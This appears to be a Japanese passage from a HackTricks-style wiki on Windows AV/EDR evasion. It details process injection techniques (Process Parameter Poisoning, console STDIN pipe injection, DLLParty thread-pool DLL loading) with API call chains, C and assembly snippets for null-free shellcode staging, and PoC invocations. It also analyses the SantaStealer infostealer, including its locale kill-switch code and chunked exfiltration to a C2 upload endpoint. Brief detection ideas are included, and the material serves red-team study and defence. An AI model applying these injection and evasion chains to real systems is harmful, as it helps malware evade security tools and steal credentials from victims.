Process Parameter Poisoning (P3) は、従来のリモート書き込み経路（`VirtualAllocEx` + `WriteProcessMemory`）を回避する **process-injection / EDR-evasion** 技法です。すでに実行中の対象プロセスにバイト列をコピーする代わりに、Windows が選択された `CreateProcessW` の起動パラメータを子プロセスに **コピー**し、`PEB->ProcessParameters`（`RTL_USER_PROCESS_PARAMETERS`）内に格納する仕組みを悪用します。<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` によってコピーされる汚染可能なキャリア

有用なキャリアは次のとおりです。

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment`（`CREATE_UNICODE_ENVIRONMENT` を指定）→ `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

キャリアに関する実用上の制約：

- `lpCommandLine` は `CreateProcessW` に対して **書き込み可能なメモリ**を指す必要があり、終端の null 文字を含めて **32,767 個の Unicode 文字**までです。
- `lpEnvironment` は、連続する `NAME=VALUE\0` 文字列と、末尾の追加の `\0` で構成される Unicode 環境ブロックである必要があります。
- `lpReserved` は公式には予約済みのため、`ShellInfo` へのマッピングは、安定した文書化済みの仕様ではなく実装の詳細として扱う必要があります。

これにより、通常のプロセス作成が **payload-transfer primitive** になります。オペレーターは攻撃者が制御する起動データを使って子プロセスを作成し、Windows にプロセス間コピーを実行させます。

### リモート書き込み API を使わないリモート検索フロー

子プロセスの作成後、**読み取り専用**の primitive を使ってコピーされたバッファを解決します。

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` を取得
2. リモートの `PEB` を読み取る
3. `PEB.ProcessParameters` をたどる
4. `RTL_USER_PROCESS_PARAMETERS` を読み取る
5. 選択したポインターを使用する：
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

最小限のフロー：

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### コピーされたパラメータバッファの実行

コピーされたパラメータ領域は通常 `RW` であり、実行可能ではありません。一般的な P3 chain は次のとおりです。

1. 通常どおりプロセスを作成する（サスペンド状態にしない）
2. `NtProtectVirtualMemory` / `VirtualProtectEx` で選択したパラメータページを実行可能にする
3. `PROCESS_INFORMATION` からすでに返されているメインスレッドハンドルを再利用する
4. `NtSetContextThread`（`CONTEXT_CONTROL`、`RIP` を上書き）で実行先をリダイレクトする

従来の thread hijacking の手順とは異なり、`SuspendThread` / `ResumeThread` は**不要**です。返されたメインスレッドハンドルを使って、コンテキストを直接変更できます。

これにより、インジェクションで一般的に監視される次のような API を回避できます。

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- 多くの場合、`SuspendThread` / `ResumeThread` も

### null バイトの制約と段階的な shellcode

3 つのキャリアはいずれも**文字列または文字列に類似したデータ**であるため、`0x00` を含む raw payload は転送中に切り詰められます。実用的な回避策は、実行時に定数を再構築してから任意の第 2 ステージを読み込む、**null-free の第 1 ステージ**を使うことです。

単純な手法は、XOR による定数合成です。

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

これにより、第一段階では、転送するパラメーターに null バイトを埋め込まずに、スタック上に文字列、API 引数、DLL パス、または第二段階の shellcode loader を構築できます。

### 第一段階からのスタックベースの API 呼び出し

第一段階で `LoadLibraryA` などの API を呼び出す必要がある場合、次の操作を行えます。

- 文字列／バッファーを対象プロセスのスタックに push する
- **32-byte x64 shadow space** を確保する
- `RCX`、`RDX`、`R8`、`R9` に定数または `RSP` 相対ポインターを設定する
- 呼び出し前に `RSP` を **16-byte alignment** に保つ

その後、第二段階をスタックから `PAGE_READWRITE` の領域にコピーし、`VirtualProtect` で `PAGE_EXECUTE_READ` に変更してからジャンプできます。これにより、直接の RWX アロケーションを回避できます。

### 検出のアイデア

著者が挙げている有効なハンティング機会：

- `VirtualProtectEx` / `NtProtectVirtualMemory` によって **process-parameter pages が executable に変更される**動作
- その保護属性の変更に続く `SetThreadContext` / `NtSetContextThread`
- `PEB`、続いて `RTL_USER_PROCESS_PARAMETERS` をリモートから読み取る動作
- プロセス作成時の `lpCommandLine`、`lpEnvironment`、または `STARTUPINFO.lpReserved` の値が、異常に長い、または高エントロピーであること

### 注記

- P3 は **process 間の転送手法**であり、それ自体は完全な実行プリミティブではありません。コピーしたパラメーターには、依然として実行権限への変更と実行先を切り替える方法が必要です。
- `RtlCreateProcessReflection` / Dirty Vanity も著者らによって検討されましたが、内部で `NtWriteVirtualMemory` や `NtCreateThreadEx` などの疑わしいプリミティブに到達するため、採用されませんでした。

## Console STDIN pipe injection

対話型コンソールの子プロセスを、**payload-transfer primitive** として利用することもできます。injector は子プロセスの標準入力をパイプにリダイレクトし、marker に続けて shellcode を送信します。コンソールプログラムがデータを自身の private memory に読み込んだ後、injector はそのバッファーを見つけて実行可能にし、子スレッドの実行先をそこに切り替えます。これにより `VirtualAllocEx` と `WriteProcessMemory` は回避できますが、これは依然としてプロセスインジェクションであり、汎用的な EDR bypass ではありません。<sup>[[41]](#references)</sup>

「named-pipe」という説明とは異なり、参照実装は `CreatePipe` を呼び出します。これは **anonymous pipe** を作成します。Windows は内部で anonymous pipe を一意な名前を持つ pipe オブジェクトとして実装していますが、この PoC は `\\.\pipe\<name>` のパスを指定せず、`CreateNamedPipe` も呼び出しません。デフォルトのセキュリティ記述子で継承可能なハンドルを作成し、読み取りハンドルを `STARTUPINFO.hStdInput` に設定し、`STARTF_USESTDHANDLES` を指定して、ハンドル継承を有効にした状態で新しい子プロセスを起動します。したがって、この PoC は指定されたコンソール実行ファイルを起動するものであり、既存のプロセスにパイプを接続するものではありません。<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### 参照ワークフロー

実装では、次の手順を使用します。<sup>[[41]](#references)</sup>

1. 子プロセスの `STDIN` と `STDOUT` 用に、anonymous pipe のペアを作成する。親側の 2 つのハンドルでは継承を無効にし、プロセス作成後に親プロセス内の子側の複製ハンドルを閉じる。
2. `netsh.exe` や `nslookup.exe` などの対話型実行ファイルを `CREATE_NEW_CONSOLE` で起動する。子プロセスはリダイレクトされた標準ハンドルを継承する。
3. 親側の `STDIN` ハンドル経由で `WriteFile` を使い、完全なバイナリ `rawData` 配列を送信する。コンソールプログラムはバイト列を読み取り、そのコピーを自身の private な committed 領域のいずれかに保持する。
4. `VirtualQueryEx` で子プロセスのアドレス空間を走査し、`ReadProcessMemory` で候補となる `MEM_PRIVATE` 領域を読み取り、`rawData` の先頭にある marker を検索する。
5. `VirtualProtectEx` で見つかったバッファーを `PAGE_EXECUTE_READWRITE` に変更する。
6. メインスレッドを特定して suspend し、`NtSetContextThread` で `RIP` を `found_address + 0x19` に設定してから再開する。

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

提供された実装はx64専用です。`CONTEXT.Rip`を変更し、埋め込まれたpayloadはx64 shellcodeです。`rawData`は25バイトのmarkerで始まるため、実行可能なバイト列は16進オフセット`0x19`から始まります。payloadを置き換える場合は、このレイアウトを維持するか、marker、search vector、配列サイズ、実行オフセットをまとめて更新してください。ソースコメントには、bad characterとして`0x0A`、`0x0D`、`0x1A`も記載されています。このワークフローでは、子プロセスのtokenや権限は変更されません。<sup>[[41]](#references)</sup>

小規模なネイティブヘルパーやpayloadのコンパイルパターンについては、[Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md)を参照してください。

## shellcodeを使わないthread-pool callback DLL injection（DLLParty）

DLLPartyはPoolParty形式のthread-pool injectionを応用し、既存のターゲットworkerに、注入したcallback stubを実行させる代わりに`LoadLibraryA`を呼び出させます。dispatchの仕組みには、ターゲットpoolのI/O completion portにキューイングする`TP_DIRECT` completionを使用します。これはプロセス権限のbypassではありません。PoCは`OpenProcess(PROCESS_ALL_ACCESS)`を呼び出し、読み書き可能なターゲットメモリと、複製可能なworker-factoryおよびcompletion-port handleを必要とします。<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64では、workerはstack上にある`TP_CALLBACK_INSTANCE`へのポインターを、最初のcallback引数である`RCX`に渡します。`LoadLibraryA`は同じポインターを`LPCSTR`として解釈します。検証された経路では、`TppWorkerThread`は`RSP+0x178`にポインターを作成し、そのオブジェクトへの最初の通常の書き込みは`RSP+0x1d0`で行われます。そのため、0x58バイトのこのprefixに収まるnull終端DLL pathは、dispatch前に上書きされずにinstanceの先頭に配置できます。これは特定のbuildで確認されたものであり、文書化されたWindows ABIの保証ではありません。<sup>[[46]](#references)[[47]](#references)</sup>

参考ワークフローは次のとおりです。<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)`でターゲットのhandleを列挙し、object typeを照会して`TpWorkerFactory`を特定します。worker-factory handleを複製して`WorkerFactoryBasicInformation`を照会すると、`StartParameter`からリモートの`TP_POOL`が得られます。`TotalWorkerCount == 0`のfactoryはスキップします。
2. `TP_POOL.CompletionPort`を読み取り、poolの非公開worker listをたどります。検証したWindows 10 19045 x64 build（`ntdll.dll 10.0.19041.4842`）では、listのheadは`pool+0x60`にあり、各linkは`worker+0x10`にあるため、callback-instance slotの`worker+0x38`は`link+0x28`と一致します。PoCはポインターのalignment、linkの相互参照、poolの所有関係、ゼロ以外のthread ID、nodeの重複、list headの安定性を確認します。
3. キューに入れたcompletionはどのworkerにも処理される可能性があるため、見つかった**すべての**worker slotにDLL pathを書き込みます。書き込み可能なターゲットメモリに`Callback = LoadLibraryA`の`TP_DIRECT`を配置します。PoCは`VirtualAllocEx`ではなくworker stack上の`last_slot-0x500`を使用します。このオフセットは実験的なものであり、使用中のstackデータと衝突しないようにする必要があります。
4. ターゲットのcompletion-port handleを複製し、`ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`を呼び出します。リモートの`TP_DIRECT`アドレスがcompletion keyになります。既存のworkerが、上書きされたcallback-instanceポインターを使って`LoadLibraryA`を呼び出し、ターゲットからアクセス可能なDLLを読み込みます。

PoCはターゲットPID（`DLLParty.exe <target_pid>`）を受け取り、`DLLParty.cpp`内の固定DLL pathを使用します。build前に、ターゲットからアクセス可能なpathを設定し、x64 executableをビルドしてください。また、自プロセスの`LoadLibraryA`アドレスをリモートcallbackとして使用するため、そのアドレスがターゲットでも有効であることを前提としています。コードは、pathが0x58バイトのprefixに収まるか、worker traversalによってslotが見つかってから最後の要素を参照しているかを確認しません。ターゲットbuildの非公開offset、stack layout、書き込み可能な領域を再検証してください。`CreateRemoteThreadEx`、shellcode、`VirtualAllocEx`を使用しなくても、プロセス間の書き込みやDLL loadのtelemetryがなくなるわけではありません。<sup>[[46]](#references)[[47]](#references)</sup>

## fileless evasionとcredential theftにおけるSantaStealerの手法

SantaStealer（別名BluelineStealer）は、最新のinfo-stealerがAV bypass、anti-analysis、credential accessをひとつのワークフローに組み合わせる手法を示しています。<sup>[[24]](#references)</sup>

### Keyboard layoutによる判定とsandboxでの遅延

- 設定フラグ（`anti_cis`）は`GetKeyboardLayoutList`を使ってインストール済みのkeyboard layoutを列挙します。Cyrillic layoutが見つかった場合、サンプルは空の`CIS` markerを作成して終了します。これにより、除外対象のlocaleでは実行されず、調査用の痕跡だけが残ります。

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### 多層構造の `check_antivm` ロジック

- Variant A はプロセスリストを走査し、各名前を独自の rolling checksum でハッシュ化して、デバッガー／sandbox 向けの埋め込み blocklist と照合する。コンピューター名にも同じ checksum 処理を行い、`C:\analysis` などの作業ディレクトリも確認する。
- Variant B はシステムのプロパティ（プロセス数の下限、起動後の経過時間）を調べ、`OpenServiceA("VBoxGuest")` を呼び出して VirtualBox additions を検出し、sleep の前後でタイミングチェックを実施して single-stepping を見つける。いずれかに該当すると、モジュールの起動前に処理を中断する。

### Fileless helper + 二重 ChaCha20 reflective loading

- メインの DLL/EXE には Chromium credential helper が埋め込まれており、ディスクにドロップするか、メモリ上に手動で map する。fileless モードでは import と relocation を独自に解決するため、helper の痕跡はファイルとして残らない。
- この helper は、ChaCha20（32-byte key 2つ + 12-byte nonce）で二重に暗号化された second-stage DLL を保持する。2回の復号後、blob を reflective loading（`LoadLibrary` は使用しない）し、[ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) に由来する export `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` を呼び出す。<sup>[[25]](#references)</sup>
- ChromElevator のルーチンは direct-syscall reflective process hollowing を使って稼働中の Chromium browser に inject し、AppBound Encryption key を継承する。その後、ABE の hardening にもかかわらず、SQLite database から password/cookie/credit card 情報を直接復号する。

### モジュール式のメモリ内収集とチャンク分割 HTTP exfil

- `create_memory_based_log` はグローバルな `memory_generators` 関数ポインターテーブルを順に処理し、有効なモジュール（Telegram、Discord、Steam、screenshot、document、browser extension など）ごとに thread を1つ起動する。各 thread は共有 buffer に結果を書き込み、約45秒の join window 後にファイル数を報告する。
- 完了すると、静的リンクされた `miniz` library を使ってすべてを `%TEMP%\\Log.zip` に圧縮する。続いて `ThreadPayload1` は15秒 sleep し、browser の `multipart/form-data` boundary（`----WebKitFormBoundary***`）を偽装して、archive を10 MB単位で `http://<C2>:6767/upload` に HTTP POST で送信する。各 chunk には `User-Agent: upload`、`auth: <build_id>`、任意で `w: <campaign_tag>` が追加され、最後の chunk には `complete: true` が付与され、C2 に再構成の完了を知らせる。

## References

- [1] [高度な回避手法：精密なモジュールスタンピング](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – ブログ](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack：マルウェアにもう甘い対応はしない](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – ドキュメント](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – サンプル](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – サンプル](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer の新たな感染チェーンと ConfuserEx ベースの難読化](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – 自社の zero trust を信頼すべきか？Zscaler の posture check を回避する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell 以前：Storm-2603 の過去の ransomware 攻撃を調査する](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading：転送された export の悪用](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 の転送された export 一覧（apis_fwd.txt）](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library の検索順序](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – プロセスのセキュリティとアクセス権](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU リファレンス（MS-PPSEC）](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light（PPL）の保護機能を活用して EDR に対抗する](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Technique で Windows Defender の保護層を破る](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink コマンドのリファレンス](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Pure Curtain の裏側：RAT から builder、そして coder へ](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer がやってくる：新たな野心的 infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption の復号](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API tracing で Node.js malware を阻止する](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko の sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet ETW を隠す](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team の作戦で Chrome Remote Desktop を悪用する：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の remediation driver を kernel operation primitive として兵器化する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo の関連コード](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：LLVM を使った self-masking function の作成](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole のソース](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe 関数](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - 入出力をリダイレクトした子プロセスの作成](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy：WasmForge で C# ツールを再構築する](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - C# / .NET project のコンパイル](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty の proof-of-concept とソース](https://github.com/epersic/DLLParty)
- [47] [DLLParty — thread pool の内部機構を悪用した shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset と thrember tool](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [EMBER2024 を使った red team implant の評価](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Machine Learning ベースの検知を回避する](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
